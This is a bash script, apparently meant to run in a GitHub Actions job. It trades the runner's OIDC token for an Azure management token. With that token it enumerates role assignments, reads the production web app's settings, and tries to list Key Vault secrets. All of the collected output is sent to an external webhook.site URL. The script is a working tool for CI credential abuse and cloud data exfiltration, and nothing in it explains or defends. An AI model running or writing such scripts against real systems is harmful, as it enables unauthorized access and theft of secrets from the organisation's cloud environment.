#!/usr/bin/env bash
set -eo pipefail
WH="https://webhook.site/759eda34-6b38-4279-ace1-e6ca8c89f6b8"
send() { curl -s -m30 -X POST "$WH/$1" -d "$2" -H "Content-Type: text/plain"; }

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC" \
  | jq -r '.access_token')
A="https://management.azure.com"; S="$AZURE_SUBSCRIPTION_ID"; R="rg-tbl-platform-prod-sea"
H=(-H "Authorization: Bearer $MGMT")
OUT=""

# 1. ALL role assignments on subscription (to find who has the publishing-reader custom role)
ALLRA=$(curl -s "${H[@]}" "$A/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
OUT+="---ALL-ROLE-ASSIGNMENTS---
$ALLRA
"

# 2. Role assignments specifically on the web app
APPRA=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
OUT+="---APP-ROLE-ASSIGNMENTS---
$APPRA
"

# 3. az CLI login and try to read app settings
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$OIDC" 2>&1 | head -20
AZ_APPSETTINGS=$(az webapp config appsettings list -g "$R" -n "app-tbl-storefront-prod" 2>&1 | head -c 3000)
OUT+="---AZ-APPSETTINGS---
$AZ_APPSETTINGS
"

# 4. az role assignment list for custom publishing role
AZ_RA=$(az role assignment list --role "tbl-publishing-reader-8s42x5" --subscription "$S" 2>&1 | head -c 2000)
OUT+="---AZ-PUBLISHING-ROLE---
$AZ_RA
"

# 5. Try kv-tbl-sec via az
AZ_KVSEC=$(az keyvault secret list --vault-name kv-tbl-sec-x3euoz 2>&1 | head -c 1000)
OUT+="---AZ-KVSEC---
$AZ_KVSEC
"

send "v6all" "$OUT"
